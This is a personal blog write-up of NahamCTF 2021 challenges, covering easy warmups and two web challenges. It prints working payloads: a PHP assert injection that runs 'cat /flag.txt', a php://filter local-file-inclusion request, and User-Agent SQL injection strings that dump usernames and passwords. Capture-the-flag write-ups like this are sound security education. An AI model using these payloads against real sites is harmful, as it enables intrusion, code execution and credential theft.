---
title: "CTF - Naham CTF 2021"
categories: [ctf]
date: 2021-02-20
comments: true
image: /images/writeups/NahamCTF2021/logo.png
description: CTF - Naham CTF 2021
---

# Naham CTF 2021

<p align="center">
  <img src="/images/writeups/NahamCTF2021/logo.png" width="20%"/>
</p>


I participate in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges!


<p align="center">
  <img src="/images/writeups/NahamCTF2021/rank.png" width="70%"/>
</p>

---

Challenge index:

### Crypto

- [war(sa)mup](#warsamup)


---

# Warmup

## Veebee 
50 points - Warmups - easy

Buzz buzz, can you find the honey? 

Check the [video](https://www.youtube.com/watch?v=3Q9-X_NRlJc) and fix the code as John did in order to decode that vbe file:

```
kali@kali:~/Desktop/CTFs/NahamCTF2021/Warmup$ python2 decode-vbe.py veebee.vbe 
' VeeBee goes buzz buzz
'
'
MsgBox("Sorry, not that easy!")
MsgBox("Okay, actually, you're right. It is that easy.")
MsgBox("flag{f805593d933f5433f2a04f082f400d8c}")
```

``` flag{f805593d933f5433f2a04f082f400d8c} ```


## Buzz 
50 points - Warmups - easy

You know, that sound that bumblebees make? 

We got a compress file:

```
kali@kali:~/Desktop/CTFs/NahamCTF2021/Warmup$ file buzz
buzz: compress'd data 16 bits

kali@kali:~/Desktop/CTFs/NahamCTF2021/Warmup$ uncompress -cvf buzz
buzz:   flag{b3a33db7ba04c4c9052ea06d9ff17869}
```

``` flag{b3a33db7ba04c4c9052ea06d9ff17869} ```


## Eighth Circle 
50 points - Warmups - easy

Abandon all hope, ye who enter here... 

```
D'`r#LK\[}{{EUUTet,r*qo'nmlk5ihVB0S!>w<<)9xqYonsrqj0hPlkdcb(...
```

Looking for eighth circle in Google it makes a reference to [Malbolge](https://esolangs.org/wiki/malbolge), which is an esoteric programming language.

Using a [Malbolge online compiler](http://malbolge.doleczek.pl/) we could get the flag:

``` flag{bf201f669b8c4adf8b91f09165ec8c5c} ```

---

# Web

## Asserted 
338 points - Web - medium

Time to hit the gym! Assert all your energy! Err, wait, is the saying "exert" all your energy? I don't know...

The flag is in /flag.txt.

We get into a simple website of a gym. It all looked normal:

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/1_web.png" width="70%"/>
</p>

But when surfing through the website, the about page had a different URL were it uses the page argument:

``` http://challenge.nahamcon.com:31132/index.php?page=about ```

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/1_web2.png" width="70%"/>
</p>

Well... It's not only about page, but the schedule page also has that parameter. Seems like it depends where you are coming from, i.e. if you are on index, the schedule URL is _http://challenge.nahamcon.com:31132/index.php?page=schedule_ but from gallery for example we have this URL _http://challenge.nahamcon.com:31132/schedule.php_. On the about page we have this not found...

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/1_about.png" width="70%"/>
</p>

Let's try some LFI attacks...

Using [RFI/LFI payloadbox](https://github.com/payloadbox/rfi-lfi-payload-list) GitHub repo we end up using PHP wrappers to encode the index website and retrieve it.

_http://challenge.nahamcon.com:31132/index.php?page=php://filter/convert.base64-encode/resource=index_

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/1_lfi.png" width="70%"/>
</p>

Decoding the payload we get:

{% highlight php %}
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");
  
} else {
  $file = "home.php";
}

include($file);

?>
{% endhighlight %}

We could use an [expoit from assert function](https://hydrasky.com/network-security/php-assert-vulnerable-to-local-file-inclusion/) to retrieve the flag. Since we know that the flag is in /flag.txt:


``` ', 'qwer') ===false && strlen(file_get_contents('/flag.txt')) == 0 && strpos('1 ```

We crafted the following payload and [encode it](https://www.urlencoder.org/)

```
','sup') ===false && system('cat /flag.txt') && strops('

%27%2C%27sup%27%29%20%3D%3D%3Dfalse%20%26%26%20system(%27cat%20%2Fflag.txt%27)%20%26%26%20strops%28%27
```

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/1_flag.png" width="70%"/>
</p>

``` flag{85a25711fa6e111ed54b86468a45b90c} ```


## Bad Blog 
478 points - Web - medium

We just added analytics to our blogging website. Check them out! 

We create an account at the website:

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/2_reg.png" width="70%"/>
</p>

We create a post:

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/2_post.png" width="70%"/>
</p>

And clicking on our profile we can see the user agents of the visitors (me). This is the analytics they say in the chall:

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/2_visits.png" width="70%"/>
</p>

Let's try some injection on the User-Agent:

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/2_burp.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/2_req.png" width="70%"/>
</p>

For input: _asdf' OR 1=1--_ we get:

```
(sqlite3.OperationalError) incomplete input<br>
[SQL: insert into visit (post_id, user_id, ua) values (5,2,'asdf' OR 1=1--');]<br>
(Background on this error at: http://sqlalche.me/e/13/e3q8)
```

Well, this error shows that the app is using an insert in order to add it to the database. Let's try to retrieve some users...

With this payload we get an error, we cannot execure two statements:

```
asdf');(select password from user)--
insert into visit (post_id, user_id, ua) values (5,2,'asdf');(select password from user)--');

Response:
You can only execute one statement at a time.
```

Let's go for other paylaod:

```
asdf'),(5,2,(select user_id from user))--
asdf'),(5,2,(select username from user))--
asdf'),(5,2,(select password from user))--

insert into visit (post_id, user_id, ua) values (5,2,'asdf'),(5,2,(select password from user))--');
```

First payload failed, but the username and password columns are displayed, but lets use group_concat() function in order to display all the rows of the table:

```
asdf'),(5,2,(select group_concat(username) from user))--
asdf'),(5,2,(select group_concat(password) from user))--
```

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/2_pass.png" width="70%"/>
</p>

Log in as Admin and flag will show up:

<p align="center">
  <img src="/images/writeups/NahamCTF2021/Web/2_flag.png" width="70%"/>
</p>

``` flag{8b31eecb1831ed594fa27ef5b431fe34} ```

---

That's all! Thanks for reading my writeups!!
